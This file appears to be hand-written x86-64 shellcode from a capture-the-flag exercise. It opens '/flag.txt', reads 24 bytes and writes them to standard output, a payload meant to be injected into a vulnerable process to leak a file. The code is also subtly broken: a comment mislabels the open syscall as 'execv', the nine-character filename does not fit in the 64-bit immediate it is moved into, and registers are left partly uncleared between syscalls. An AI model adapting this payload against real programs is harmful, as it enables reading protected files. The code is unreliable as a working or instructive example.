global _start

section .text
_start:
    xor rax, rax ; cleaning the rax
    push rax
    mov rdi, '/flag.txt' ; file name rest
    push rdi

    ; open('rsp', 'O_RDONLY')
    mov al, 2 ; calling execv
    mov rdi, rsp ; move pointer to filename
    mov rsi, 0
    syscall

    ; reding file
    lea rsi, [rdi]; pointer to opened file
    mov rdi, rax; set fd to rax from open syscall
    mov al, 0; read syscall number
    mov dl, 24 ; size to read
    syscall

    ; write output
    mov al, 1; write syscall rax
    mov dil, 1 ; set fd to stdout rdi
    mov dl, 24; size to read rdx
    syscall